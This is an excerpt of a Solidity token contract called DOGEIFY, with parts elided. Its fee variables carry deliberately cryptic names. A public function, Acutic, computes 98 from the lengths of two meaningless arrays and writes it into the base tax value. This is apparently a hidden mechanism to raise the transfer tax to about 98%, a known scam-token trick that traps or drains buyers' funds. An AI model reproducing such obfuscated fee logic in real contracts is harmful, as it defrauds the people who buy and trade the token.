...
contract DOGEIFY is Context, IERC20, Ownable {
    ...
    uint256 private BtCst = 2;
    uint256 private _tFeeTotal;
    uint256 private _redisFeeOnBuy = 0;
    uint256 private CtCstOnBuy = 1;
    uint256 private _redisFeeOnSell = 0;

    uint256[4] Collect1 = [1,23,4,5];
    uint256[6] Collecttwo = [0,1,12,31,4,7];
    uint256 private Htcst;
    uint256 private gtgst = 2;

    //Original Fee
    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private CtCst = BtCst;

    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = CtCst;
    ...
    function removeAllFee() private {
        if (_redisFee == 0 && CtCst == 0) return;

        _previousredisFee = _redisFee;
        _previoustaxFee = CtCst;
        ...
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisFee, CtCst);
        uint256 currentRate = _getRate();
    ...
    function Acutic() public {
            Htcst = ((Collect1.length)**2)*(Collecttwo.length) + gtgst;
            BtCst = Htcst; 
        }
